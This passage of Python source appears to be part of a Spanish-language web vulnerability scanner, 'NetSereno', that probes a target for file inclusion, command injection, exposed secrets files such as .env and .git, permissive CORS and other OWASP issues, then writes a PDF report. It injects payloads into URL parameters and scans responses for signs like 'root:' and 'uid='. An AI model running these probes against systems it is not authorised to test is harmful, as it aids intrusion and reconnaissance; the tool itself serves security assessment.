                ['file', 'page', 'path', 'template', 'include', 'doc', 'folder', 'root', 'pg'])]

            for param_info in file_params[:5]:
                for payload in self.lfi_payloads[:3]:
                    try:
                        test_url = self._inject_url_parameter(param_info['name'], payload)
                        response = requests.get(test_url, headers=self.headers, timeout=5, verify=False)

                        lfi_indicators = ['root:', '/bin/', '[extensions]', 'localhost']

                        for indicator in lfi_indicators:
                            if indicator in response.text:
                                results["findings"].append({
                                    "type": "Inclusión de archivo local (LFI)",
                                    "parameter": param_info['name'],
                                    "payload": payload,
                                    "cve": "CWE-98",
                                    "cvss": 8.6,
                                    "severity": "Critical",
                                    "description": "Se pudo acceder a archivos del sistema"
                                })
                                results["vulnerable"] = True
                                break
                    except Exception:
                        continue

        except Exception as e:
            results["error"] = str(e)

        if not results["findings"]:
            results["findings"].append({"info": "No se detectaron vulnerabilidades de inclusión de archivos"})

        return results

    def check_command_injection(self):
        """OS Command Injection testing"""
        results = {"vulnerable": False, "findings": [], "severity": "Critical"}

        try:
            params = self._find_all_parameters()

            cmd_params = [p for p in params if any(x in p['name'].lower() for x in
                ['cmd', 'command', 'exec', 'ping', 'query', 'ip', 'host'])]

            for param_info in cmd_params[:3]:
                for payload in self.command_payloads[:3]:
                    try:
                        test_url = self._inject_url_parameter(param_info['name'], payload)
                        response = requests.get(test_url, headers=self.headers, timeout=5, verify=False)

                        cmd_indicators = ['uid=', 'gid=', 'root', 'www-data', 'Directory of', 'Volume Serial']

                        for indicator in cmd_indicators:
                            if indicator in response.text:
                                results["findings"].append({
                                    "type": "Inyección de comandos",
                                    "parameter": param_info['name'],
                                    "cve": "CWE-78",
                                    "cvss": 9.8,
                                    "severity": "Critical",
                                    "description": "Se pudo ejecutar comandos del sistema operativo"
                                })
                                results["vulnerable"] = True
                                break
                    except Exception:
                        continue

        except Exception as e:
            results["error"] = str(e)

        if not results["findings"]:
            results["findings"].append({"info": "No se detectaron vulnerabilidades de inyección de comandos"})

        return results

    def check_broken_authentication(self):
        """Authentication and session testing"""
        results = {"vulnerable": False, "findings": [], "severity": "Critical"}

        try:
            # Check for login pages without HTTPS
            for path in self.admin_paths[:10]:
                try:
                    url = f"{self.base_url}{path}"
                    response = requests.get(url, headers=self.headers, timeout=5, verify=False, allow_redirects=True)

                    if response.status_code == 200:
                        login_indicators = ['password', 'contraseña', 'login', 'signin', 'iniciar sesion', 'acceder']

                        if any(ind in response.text.lower() for ind in login_indicators):
                            if not url.startswith('https'):
                                results["findings"].append({
                                    "type": "Login sin HTTPS",
                                    "url": url,
                                    "cve": "CWE-311",
                                    "cvss": 7.5,
                                    "severity": "High",
                                    "description": "Página de autenticación accesible sin cifrado"
                                })
                                results["vulnerable"] = True

                            # Check for default credentials indicator
                            if 'admin' in response.text.lower() and ('demo' in response.text.lower() or 'test' in response.text.lower()):
                                results["findings"].append({
                                    "type": "Posibles credenciales por defecto",
                                    "url": url,
                                    "severity": "Medium"
                                })
                except Exception:
                    continue

        except Exception as e:
            results["error"] = str(e)

        if not results["findings"]:
            results["findings"].append({"info": "No se detectaron problemas de autenticación"})

        return results

    def check_broken_access_control(self):
        """Access control testing"""
        results = {"vulnerable": False, "findings": [], "severity": "Critical"}

        protected_resources = [
            "/admin", "/administrator", "/dashboard", "/panel", "/api/users",
            "/api/admin", "/config", "/settings", "/backup", "/database",
            "/phpMyAdmin", "/phpmyadmin", "/server-status", "/server-info",
            "/.git/", "/.env", "/wp-config.php"
        ]

        try:
            for path in protected_resources:
                try:
                    url = f"{self.base_url}{path}"
                    response = requests.get(url, headers=self.headers, timeout=5, verify=False)

                    if response.status_code == 200:
                        # Check if it's a real resource (not custom 404)
                        if len(response.text) > 100:
                            auth_required = ['login', 'password', 'unauthorized', 'forbidden', 'acceso denegado']

                            if not any(auth in response.text.lower() for auth in auth_required):
                                results["findings"].append({
                                    "type": "Recurso sin autenticación",
                                    "url": url,
                                    "cve": "CWE-284",
                                    "cvss": 7.5,
                                    "severity": "High",
                                    "description": "Recurso protegido accesible sin autenticación"
                                })
                                results["vulnerable"] = True
                except Exception:
                    continue

        except Exception as e:
            results["error"] = str(e)

        if not results["findings"]:
            results["findings"].append({"info": "No se detectaron problemas de control de acceso"})

        return results

    def check_sensitive_files(self):
        """Check for exposed sensitive files"""
        results = {"vulnerable": False, "findings": [], "severity": "High"}

        try:
            for file_path in self.sensitive_files[:25]:
                try:
                    url = f"{self.base_url}{file_path}"
                    response = requests.head(url, headers=self.headers, timeout=3, verify=False)

                    if response.status_code == 200:
                        # Verify with GET for certain files
                        if any(x in file_path for x in ['.git', '.env', 'config', 'backup', '.sql']):
                            get_response = requests.get(url, headers=self.headers, timeout=3, verify=False)
                            if len(get_response.text) > 10:
                                severity = "Critical" if any(x in file_path for x in ['.env', '.git', 'config', 'backup']) else "High"
                                results["findings"].append({
                                    "type": "Archivo sensible expuesto",
                                    "url": url,
                                    "cve": "CWE-538",
                                    "cvss": 7.5 if severity == "Critical" else 5.3,
                                    "severity": severity,
                                    "description": f"Archivo sensible accesible públicamente"
                                })
                                results["vulnerable"] = True
                        else:
                            results["findings"].append({
                                "type": "Archivo encontrado",
                                "url": url,
                                "severity": "Info"
                            })
                except Exception:
                    continue

        except Exception as e:
            results["error"] = str(e)

        if not results["findings"]:
            results["findings"].append({"info": "No se encontraron archivos sensibles expuestos"})

        return results

    def check_security_misconfiguration(self):
        """Security misconfiguration testing"""
        results = {"vulnerable": False, "findings": [], "severity": "High"}

        try:
            # Check directory listing
            dirs = ["/images/", "/uploads/", "/files/", "/assets/", "/static/", "/media/"]

            for dir_path in dirs:
                try:
                    url = f"{self.base_url}{dir_path}"
                    response = requests.get(url, headers=self.headers, timeout=5, verify=False)

                    if "Index of" in response.text or "Directory listing" in response.text or "<title>Index of" in response.text:
                        results["findings"].append({
                            "type": "Listado de directorios habilitado",
                            "url": url,
                            "cve": "CWE-548",
                            "cvss": 5.3,
                            "severity": "Medium",
                            "description": "El servidor muestra el contenido del directorio"
                        })
                        results["vulnerable"] = True
                except Exception:
                    continue

            # Check for default pages
            default_pages = [
                "/phpinfo.php", "/info.php", "/test.php",
                "/adminer.php", "/server-status", "/server-info"
            ]

            for page in default_pages:
                try:
                    url = f"{self.base_url}{page}"
                    response = requests.get(url, headers=self.headers, timeout=5, verify=False)

                    if response.status_code == 200:
                        if 'phpinfo' in response.text.lower() or 'php version' in response.text.lower():
                            results["findings"].append({
                                "type": "phpinfo() expuesto",
                                "url": url,
                                "cve": "CWE-200",
                                "cvss": 5.3,
                                "severity": "Medium",
                                "description": "Información del servidor PHP expuesta"
                            })
                            results["vulnerable"] = True
                        elif 'apache' in response.text.lower() and 'server status' in response.text.lower():
                            results["findings"].append({
                                "type": "Server Status expuesto",
                                "url": url,
                                "severity": "Medium"
                            })
                            results["vulnerable"] = True
                except Exception:
                    continue

        except Exception as e:
            results["error"] = str(e)

        if not results["findings"]:
            results["findings"].append({"info": "No se detectaron configuraciones incorrectas"})

        return results

    def check_vulnerable_components(self):
        """Check for vulnerable components and libraries"""
        results = {"vulnerable": False, "findings": [], "severity": "High"}

        try:
            response = requests.get(self.target_url, headers=self.headers, timeout=10, verify=False)

            # Check Server header
            server = response.headers.get('Server', '')
            if server:
                self._check_server_version(server, results)

            # Check X-Powered-By
            powered_by = response.headers.get('X-Powered-By', '')
            if powered_by:
                self._check_powered_by(powered_by, results)

            # Check for vulnerable JavaScript libraries
            js_patterns = [
                (r'jquery[.-]?([\d.]+)', 'jQuery'),
                (r'angular[.-]?([\d.]+)', 'Angular'),
                (r'react[.-]?([\d.]+)', 'React'),
                (r'bootstrap[.-]?([\d.]+)', 'Bootstrap'),
            ]

            for pattern, lib in js_patterns:
                match = re.search(pattern, response.text, re.I)
                if match:
                    version = match.group(1) if match.groups() else 'unknown'
                    if version and version != 'unknown':
                        # Check jQuery specifically
                        if lib == 'jQuery':
                            try:
                                major = int(version.split('.')[0])
                                minor = int(version.split('.')[1]) if len(version.split('.')) > 1 else 0
                                if major < 3 or (major == 3 and minor < 5):
                                    cve_info = CVE_DATABASE.get('jquery_old', {})
                                    results["findings"].append({
                                        "type": "Librería JavaScript vulnerable",
                                        "library": lib,
                                        "version": version,
                                        "cve": cve_info.get('cve', 'CVE-2020-11023'),
                                        "cvss": cve_info.get('cvss', 6.1),
                                        "severity": "Medium"
                                    })
                                    results["vulnerable"] = True
                            except Exception:
                                pass
                        else:
                            results["findings"].append({
                                "type": "Librería detectada",
                                "library": lib,
                                "version": version,
                                "severity": "Info"
                            })

        except Exception as e:
            results["error"] = str(e)

        if not results["findings"]:
            results["findings"].append({"info": "No se detectaron componentes vulnerables conocidos"})

        return results

    def _check_server_version(self, server, results):
        """Check server version for vulnerabilities"""
        server_lower = server.lower()

        vuln_servers = [
            ('apache/2.2', 'apache_2.2', 'Apache 2.2'),
            ('apache/2.4.1', 'apache_2.4.1', 'Apache 2.4.1'),
            ('nginx/1.10', 'nginx_1.10', 'Nginx 1.10'),
            ('iis/6', 'iis_6', 'IIS 6.0'),
            ('iis/7', 'iis_7', 'IIS 7.0'),
        ]

        for pattern, cve_key, name in vuln_servers:
            if pattern in server_lower:
                cve_info = CVE_DATABASE.get(cve_key, {})
                if cve_info:
                    results["findings"].append({
                        "type": "Servidor web obsoleto",
                        "server": server,
                        "cve": cve_info.get('cve', 'N/A'),
                        "cvss": cve_info.get('cvss', 0),
                        "description": cve_info.get('description', f'{name} tiene vulnerabilidades conocidas'),
                        "severity": "High"
                    })
                    results["vulnerable"] = True
                break

    def _check_powered_by(self, powered_by, results):
        """Check X-Powered-By for vulnerabilities"""
        powered_lower = powered_by.lower()

        if 'php/5' in powered_lower or 'php/7.0' in powered_lower:
            cve_info = CVE_DATABASE.get('php_5', {})
            results["findings"].append({
                "type": "Versión de PHP obsoleta",
                "version": powered_by,
                "cve": cve_info.get('cve', 'N/A'),
                "cvss": cve_info.get('cvss', 0),
                "severity": "Critical"
            })
            results["vulnerable"] = True
        else:
            results["findings"].append({
                "type": "Tecnología expuesta",
                "header": f"X-Powered-By: {powered_by}",
                "severity": "Low",
                "description": "Se recomienda ocultar esta cabecera"
            })

    def check_http_methods(self):
        """Check for dangerous HTTP methods"""
        results = {"vulnerable": False, "findings": [], "severity": "Medium"}

        dangerous_methods = ['PUT', 'DELETE', 'TRACE', 'CONNECT', 'OPTIONS']
        enabled_methods = []

        try:
            # OPTIONS request to get allowed methods
            try:
                response = requests.options(self.target_url, headers=self.headers, timeout=5, verify=False)
                allowed = response.headers.get('Allow', '')
                if allowed:
                    enabled_methods = [m.strip() for m in allowed.split(',')]
            except Exception:
                pass

            # Test each method
            for method in dangerous_methods:
                try:
                    response = requests.request(method, self.target_url, headers=self.headers, timeout=3, verify=False)
                    if response.status_code not in [405, 501, 403]:
                        if method not in enabled_methods:
                            enabled_methods.append(method)
                except Exception:
                    continue

            dangerous_enabled = [m for m in enabled_methods if m in ['PUT', 'DELETE', 'TRACE']]

            if dangerous_enabled:
                results["findings"].append({
                    "type": "Métodos HTTP peligrosos habilitados",
                    "methods": ", ".join(dangerous_enabled),
                    "cve": "CWE-749",
                    "cvss": 5.3,
                    "severity": "Medium",
                    "description": "Estos métodos pueden permitir modificar o eliminar recursos"
                })
                results["vulnerable"] = True

            if 'TRACE' in enabled_methods:
                results["findings"].append({
                    "type": "TRACE habilitado",
                    "cve": "CVE-2004-2320",
                    "cvss": 5.3,
                    "severity": "Medium",
                    "description": "TRACE puede ser usado para ataques XST (Cross-Site Tracing)"
                })
                results["vulnerable"] = True

        except Exception as e:
            results["error"] = str(e)

        if not results["findings"]:
            results["findings"].append({"info": "Solo métodos HTTP seguros habilitados"})

        return results

    def check_cookie_security(self):
        """Check cookie security settings"""
        results = {"vulnerable": False, "findings": [], "severity": "Medium"}

        try:
            response = requests.get(self.target_url, headers=self.headers, timeout=10, verify=False)

            for cookie in response.cookies:
                issues = []

                if not cookie.secure and self.target_url.startswith('https'):
                    issues.append("Sin flag Secure")

                if not cookie.has_nonstandard_attr('HttpOnly'):
                    issues.append("Sin flag HttpOnly")

                samesite = cookie.get_nonstandard_attr('SameSite')
                if not samesite or samesite.lower() == 'none':
                    issues.append("SameSite no configurado correctamente")

                if issues:
                    results["findings"].append({
                        "type": "Cookie insegura",
                        "cookie": cookie.name,
                        "issues": ", ".join(issues),
                        "cve": "CWE-614",
                        "cvss": 5.3,
                        "severity": "Medium"
                    })
                    results["vulnerable"] = True

        except Exception as e:
            results["error"] = str(e)

        if not results["findings"]:
            results["findings"].append({"info": "Configuración de cookies correcta"})

        return results

    def check_cors(self):
        """Check CORS configuration"""
        results = {"vulnerable": False, "findings": [], "severity": "Medium"}

        try:
            # Test with different origins
            test_origins = [
                'https://evil.com',
                'null',
                self.base_url
            ]

            for origin in test_origins:
                try:
                    headers = {**self.headers, 'Origin': origin}
                    response = requests.get(self.target_url, headers=headers, timeout=5, verify=False)

                    acao = response.headers.get('Access-Control-Allow-Origin', '')
                    acac = response.headers.get('Access-Control-Allow-Credentials', '')

                    if acao == '*':
                        results["findings"].append({
                            "type": "CORS permisivo",
                            "header": "Access-Control-Allow-Origin: *",
                            "cve": "CWE-942",
                            "cvss": 5.3,
                            "severity": "Medium",
                            "description": "CORS permite cualquier origen"
                        })
                        results["vulnerable"] = True
                        break
                    elif acao == origin and origin == 'https://evil.com':
                        results["findings"].append({
                            "type": "CORS refleja origen arbitrario",
                            "cve": "CWE-942",
                            "cvss": 7.5,
                            "severity": "High",
                            "description": "CORS refleja cualquier origen en la respuesta"
                        })
                        results["vulnerable"] = True

                        if acac.lower() == 'true':
                            results["findings"].append({
                                "type": "CORS con credenciales",
                                "severity": "Critical",
                                "description": "Configuración peligrosa que permite robo de sesión"
                            })
                        break
                except Exception:
                    continue

        except Exception as e:
            results["error"] = str(e)

        if not results["findings"]:
            results["findings"].append({"info": "Configuración CORS correcta"})

        return results

    def check_csrf(self):
        """Check for CSRF protection"""
        results = {"vulnerable": False, "findings": [], "severity": "Medium"}

        try:
            response = requests.get(self.target_url, headers=self.headers, timeout=10, verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')

            forms = soup.find_all('form', method=re.compile(r'post', re.I))

            csrf_tokens = ['csrf', 'token', '_token', 'authenticity_token', 'csrfmiddlewaretoken']

            forms_without_csrf = 0
            for form in forms[:5]:
                has_csrf = False
                for input_field in form.find_all('input', type='hidden'):
                    name = input_field.get('name', '').lower()
                    if any(token in name for token in csrf_tokens):
                        has_csrf = True
                        break

                if not has_csrf:
                    forms_without_csrf += 1

            if forms_without_csrf > 0:
                results["findings"].append({
                    "type": "Formularios sin protección CSRF",
                    "count": forms_without_csrf,
                    "cve": "CWE-352",
                    "cvss": 6.5,
                    "severity": "Medium",
                    "description": f"Se encontraron {forms_without_csrf} formularios POST sin tokens CSRF"
                })
                results["vulnerable"] = True

        except Exception as e:
            results["error"] = str(e)

        if not results["findings"]:
            results["findings"].append({"info": "Protección CSRF aparentemente implementada"})

        return results

    def check_subdomain_takeover(self):
        """Check for subdomain takeover indicators"""
        results = {"vulnerable": False, "findings": [], "severity": "High"}

        takeover_indicators = [
            "There isn't a GitHub Pages site here",
            "NoSuchBucket",
            "No Such Account",
            "You're Almost There",
            "project not found",
            "The specified bucket does not exist"
        ]

        try:
            response = requests.get(self.target_url, headers=self.headers, timeout=10, verify=False)

            for indicator in takeover_indicators:
                if indicator in response.text:
                    results["findings"].append({
                        "type": "Posible subdomain takeover",
                        "indicator": indicator[:50],
                        "cve": "CWE-940",
                        "cvss": 7.5,
                        "severity": "High",
                        "description": "El dominio podría ser vulnerable a takeover"
                    })
                    results["vulnerable"] = True
                    break

        except Exception as e:
            results["error"] = str(e)

        if not results["findings"]:
            results["findings"].append({"info": "No se detectaron indicadores de subdomain takeover"})

        return results

    def check_server_info(self):
        """Gather server information"""
        results = {"vulnerable": False, "findings": [], "severity": "Info"}

        results["findings"].append({
            "type": "Información del objetivo",
            "url": self.target_url,
            "ip": self.ip,
            "domain": self.domain,
            "severity": "Info"
        })

        if self.ssl_info:
            results["findings"].append({
                "type": "Información SSL/TLS",
                "protocol": self.ssl_info.get('protocol', 'N/A'),
                "cipher": self.ssl_info.get('cipher', 'N/A'),
                "severity": "Info"
            })

        if self.technologies:
            results["findings"].append({
                "type": "Tecnologías detectadas",
                "technologies": ", ".join(self.technologies[:10]),
                "severity": "Info"
            })

        if self.cms_detected:
            results["findings"].append({
                "type": "CMS detectado",
                "cms": self.cms_detected,
                "severity": "Info"
            })

        return results

    def _find_all_parameters(self):
        """Find all URL and form parameters"""
        params = []

        # URL parameters
        if '?' in self.target_url:
            query = self.target_url.split('?')[1]
            for param in query.split('&'):
                if '=' in param:
                    params.append({
                        'name': param.split('=')[0],
                        'type': 'url',
                        'url': self.target_url
                    })

        # Try to find forms
        try:
            response = requests.get(self.target_url, headers=self.headers, timeout=10, verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')

            for form in soup.find_all('form')[:5]:
                form_action = form.get('action', '')
                form_url = urljoin(self.base_url, form_action) if form_action else self.target_url

                for input_field in form.find_all(['input', 'textarea', 'select']):
                    name = input_field.get('name')
                    if name and name not in ['csrf', 'token', '_token']:
                        params.append({
                            'name': name,
                            'type': 'form',
                            'url': form_url
                        })
        except Exception:
            pass

        return params

    def _inject_url_parameter(self, param, payload):
        """Inject payload into URL parameter"""
        if '?' in self.target_url:
            base, query = self.target_url.split('?', 1)
            params = {}
            for p in query.split('&'):
                if '=' in p:
                    k, v = p.split('=', 1)
                    params[k] = v
            params[param] = quote(payload)
            return f"{base}?{'&'.join(f'{k}={v}' for k, v in params.items())}"
        return f"{self.target_url}?{param}={quote(payload)}"

    def get_summary(self):
        """Get comprehensive scan summary"""
        critical = 0
        high = 0
        medium = 0
        low = 0
        info = 0

        for result in self.results.values():
            if result.get('vulnerable'):
                severity = result.get('severity', 'Medium')
                if severity == 'Critical':
                    critical += 1
                elif severity == 'High':
                    high += 1
                elif severity == 'Medium':
                    medium += 1
                elif severity == 'Low':
                    low += 1

            for finding in result.get('findings', []):
                if 'info' not in finding:
                    sev = finding.get('severity', 'Medium')
                    if sev == 'Critical':
                        critical += 1
                    elif sev == 'High':
                        high += 1
                    elif sev == 'Medium':
                        medium += 1
                    elif sev == 'Low':
                        low += 1
                    else:
                        info += 1

        # Risk score calculation
        risk_score = (critical * 10 + high * 7 + medium * 4 + low * 1) / max(1, critical + high + medium + low + info) * 10
        risk_score = min(10, risk_score)

        if risk_score >= 8:
            risk_level = "Crítico"
        elif risk_score >= 6:
            risk_level = "Alto"
        elif risk_score >= 4:
            risk_level = "Medio"
        elif risk_score >= 2:
            risk_level = "Bajo"
        else:
            risk_level = "Mínimo"

        return {
            'total_vulnerabilities': critical + high + medium + low,
            'critical': critical,
            'high': high,
            'medium': medium,
            'low': low,
            'info': info,
            'risk_score': round(risk_score, 1),
            'risk_level': risk_level,
            'duration': (self.scan_end - self.scan_start).total_seconds() if self.scan_end and self.scan_start else 0,
            'open_ports': len(self.open_ports),
            'technologies': len(self.technologies),
            'profile': self.profile
        }

    def generate_pdf_report(self, output_path):
        """Generate comprehensive PDF report"""
        doc = SimpleDocTemplate(
            output_path,
            pagesize=A4,
            rightMargin=2*cm,
            leftMargin=2*cm,
            topMargin=2*cm,
            bottomMargin=2*cm
        )

        styles = getSampleStyleSheet()
        story = []

        # Custom styles
        title_style = ParagraphStyle(
            'CustomTitle',
            parent=styles['Heading1'],
            fontSize=28,
            textColor=colors.HexColor('#1a365d'),
            alignment=TA_CENTER,
            spaceAfter=20
        )

        subtitle_style = ParagraphStyle(
            'Subtitle',
            parent=styles['Normal'],
            fontSize=14,
            textColor=colors.HexColor('#4a5568'),
            alignment=TA_CENTER,
            spaceAfter=30
        )

        heading2_style = ParagraphStyle(
            'Heading2Custom',
            parent=styles['Heading2'],
            fontSize=16,
            textColor=colors.HexColor('#2d3748'),
            spaceBefore=20,
            spaceAfter=10
        )

        heading3_style = ParagraphStyle(
            'Heading3Custom',
            parent=styles['Heading3'],
            fontSize=12,
            textColor=colors.HexColor('#4a5568'),
            spaceBefore=15,
            spaceAfter=8
        )

        normal_style = ParagraphStyle(
            'NormalCustom',
            parent=styles['Normal'],
            fontSize=10,
            textColor=colors.HexColor('#2d3748'),
            alignment=TA_JUSTIFY
        )

        # Title Page
        story.append(Spacer(1, 2*cm))
        story.append(Paragraph("NetSereno", title_style))
        story.append(Paragraph("Informe de Evaluación de Seguridad", subtitle_style))
        story.append(Spacer(1, 1*cm))

        # Scan Info Table
        summary = self.get_summary()

        info_data = [
            ["Objetivo:", self.target_url],
            ["Dirección IP:", self.ip],
            ["Fecha de Escaneo:", self.scan_start.strftime('%d/%m/%Y %H:%M:%S') if self.scan_start else 'N/A'],
            ["Duración:", f"{summary['duration']:.1f} segundos"],
            ["Perfil de Escaneo:", self.profile.capitalize()],
            ["Nivel de Riesgo:", f"{summary['risk_level']} ({summary['risk_score']}/10)"]
        ]

        info_table = Table(info_data, colWidths=[4*cm, 10*cm])
        info_table.setStyle(TableStyle([
            ('GRID', (0, 0), (-1, -1), 0.5, colors.HexColor('#e2e8f0')),
            ('BACKGROUND', (0, 0), (0, -1), colors.HexColor('#edf2f7')),
            ('FONTNAME', (0, 0), (0, -1), 'Helvetica-Bold'),
            ('FONTNAME', (1, 0), (1, -1), 'Helvetica'),
            ('FONTSIZE', (0, 0), (-1, -1), 10),
            ('TEXTCOLOR', (0, 0), (-1, -1), colors.HexColor('#2d3748')),
            ('PADDING', (0, 0), (-1, -1), 8),
            ('VALIGN', (0, 0), (-1, -1), 'MIDDLE'),
        ]))
        story.append(info_table)
        story.append(Spacer(1, 1*cm))

        # Executive Summary
        story.append(Paragraph("Resumen Ejecutivo", heading2_style))
        story.append(HRFlowable(width="100%", thickness=1, color=colors.HexColor('#3182ce')))
        story.append(Spacer(1, 0.5*cm))

        exec_summary = f"""
        Se realizó un análisis de seguridad completo del objetivo <b>{self.domain}</b> utilizando el perfil
        de escaneo <b>{self.profile}</b>. El análisis identificó un total de <b>{summary['total_vulnerabilities']}</b>
        vulnerabilidades, con un nivel de riesgo general calificado como <b>{summary['risk_level']}</b>.
        """
        story.append(Paragraph(exec_summary, normal_style))
        story.append(Spacer(1, 0.5*cm))

        # Vulnerability Summary Table
        vuln_data = [
            ["Severidad", "Cantidad", "Porcentaje"],
            ["Crítica", str(summary['critical']), f"{summary['critical']*100//max(1,summary['total_vulnerabilities'])}%"],
            ["Alta", str(summary['high']), f"{summary['high']*100//max(1,summary['total_vulnerabilities'])}%"],
            ["Media", str(summary['medium']), f"{summary['medium']*100//max(1,summary['total_vulnerabilities'])}%"],
            ["Baja", str(summary['low']), f"{summary['low']*100//max(1,summary['total_vulnerabilities'])}%"],
        ]

        vuln_table = Table(vuln_data, colWidths=[4*cm, 4*cm, 4*cm])
        vuln_table.setStyle(TableStyle([
            ('GRID', (0, 0), (-1, -1), 0.5, colors.HexColor('#e2e8f0')),
            ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor('#3182ce')),
            ('TEXTCOLOR', (0, 0), (-1, 0), colors.white),
            ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
            ('BACKGROUND', (0, 1), (-1, 1), colors.HexColor('#fed7d7')),
            ('BACKGROUND', (0, 2), (-1, 2), colors.HexColor('#feebc8')),
            ('BACKGROUND', (0, 3), (-1, 3), colors.HexColor('#fefcbf')),
            ('BACKGROUND', (0, 4), (-1, 4), colors.HexColor('#c6f6d5')),
            ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
            ('FONTSIZE', (0, 0), (-1, -1), 10),
            ('PADDING', (0, 0), (-1, -1), 8),
        ]))
        story.append(vuln_table)
        story.append(PageBreak())

        # Detailed Findings
        story.append(Paragraph("Hallazgos Detallados", heading2_style))
        story.append(HRFlowable(width="100%", thickness=1, color=colors.HexColor('#3182ce')))

        category_names = {
            'ports_quick': 'Escaneo de Puertos',
            'ports_standard': 'Escaneo de Puertos',
            'ports_deep': 'Escaneo de Puertos',
            'services': 'Detección de Servicios',
            'ssl_tls': 'Análisis SSL/TLS',
            'ssl_ciphers': 'Cifrados SSL',
            'technologies': 'Tecnologías Detectadas',
            'cms': 'Sistema de Gestión de Contenidos',
            'security_headers': 'Cabeceras de Seguridad',
            'injection': 'Inyección SQL',
            'injection_advanced': 'Inyección SQL Avanzada',
            'xss': 'Cross-Site Scripting (XSS)',
            'xss_advanced': 'XSS Avanzado',
            'file_inclusion': 'Inclusión de Archivos',
            'command_injection': 'Inyección de Comandos',
            'broken_authentication': 'Autenticación',
            'broken_access_control': 'Control de Acceso',
            'sensitive_files': 'Archivos Sensibles',
            'security_misconfiguration': 'Configuración de Seguridad',
            'vulnerable_components': 'Componentes Vulnerables',
            'http_methods': 'Métodos HTTP',
            'cookie_security': 'Seguridad de Cookies',
            'cors': 'Configuración CORS',
            'csrf': 'Protección CSRF',
            'subdomain_takeover': 'Subdomain Takeover',
            'server_info': 'Información del Servidor',
        }

        severity_colors = {
            'Critical': colors.HexColor('#c53030'),
            'High': colors.HexColor('#dd6b20'),
            'Medium': colors.HexColor('#d69e2e'),
            'Low': colors.HexColor('#38a169'),
            'Info': colors.HexColor('#3182ce'),
        }

        for key, result in self.results.items():
            cat_name = category_names.get(key, key.replace('_', ' ').title())

            story.append(Paragraph(cat_name, heading3_style))

            for finding in result.get('findings', [])[:8]:
                if 'info' in finding:
                    story.append(Paragraph(f"✓ {finding['info']}", normal_style))
                else:
                    severity = finding.get('severity', 'Medium')
                    sev_color = severity_colors.get(severity, colors.grey)

                    finding_text = f"<font color='{sev_color.hexval()}'><b>[{severity}]</b></font> "
                    finding_text += f"<b>{finding.get('type', 'N/A')}</b><br/>"

                    if finding.get('cve'):
                        finding_text += f"CVE: {finding['cve']} | CVSS: {finding.get('cvss', 'N/A')}<br/>"
                    if finding.get('url'):
                        finding_text += f"URL: {finding['url'][:60]}...<br/>" if len(str(finding.get('url', ''))) > 60 else f"URL: {finding['url']}<br/>"
                    if finding.get('description'):
                        finding_text += f"{finding['description']}<br/>"

                    story.append(Paragraph(finding_text, normal_style))
                    story.append(Spacer(1, 0.2*cm))

            story.append(Spacer(1, 0.3*cm))

        # Recommendations
        story.append(PageBreak())
        story.append(Paragraph("Recomendaciones", heading2_style))
        story.append(HRFlowable(width="100%", thickness=1, color=colors.HexColor('#3182ce')))
        story.append(Spacer(1, 0.5*cm))

        recommendations = [
            ("Crítico", "Implemente las correcciones de vulnerabilidades críticas de forma inmediata."),
            ("SSL/TLS", "Actualice a TLS 1.3 y deshabilite protocolos y cifrados obsoletos."),
            ("Cabeceras", "Configure todas las cabeceras de seguridad HTTP recomendadas."),
            ("Actualizaciones", "Mantenga todos los componentes y bibliotecas actualizados."),
            ("Autenticación", "Implemente autenticación multifactor y políticas de contraseñas robustas."),
            ("Monitoreo", "Establezca un programa de escaneos de seguridad periódicos."),
        ]

        for title, rec in recommendations:
            story.append(Paragraph(f"<b>{title}:</b> {rec}", normal_style))
            story.append(Spacer(1, 0.2*cm))

        # Footer
        story.append(Spacer(1, 1*cm))
        story.append(HRFlowable(width="100%", thickness=0.5, color=colors.HexColor('#e2e8f0')))

        footer_style = ParagraphStyle(
            'Footer',
            parent=styles['Normal'],
            fontSize=8,
            textColor=colors.HexColor('#718096'),
            alignment=TA_CENTER
        )
        story.append(Paragraph(
            f"Generado por NetSereno - Evaluación de Seguridad Web | {datetime.datetime.now().strftime('%d/%m/%Y %H:%M')}",
            footer_style
        ))
        story.append(Paragraph(
            "Este informe es confidencial y debe ser tratado con la debida seguridad.",
            footer_style
        ))

        doc.build(story)


# Alias for backward compatibility
OWASPScanner = VulnerabilityScanner
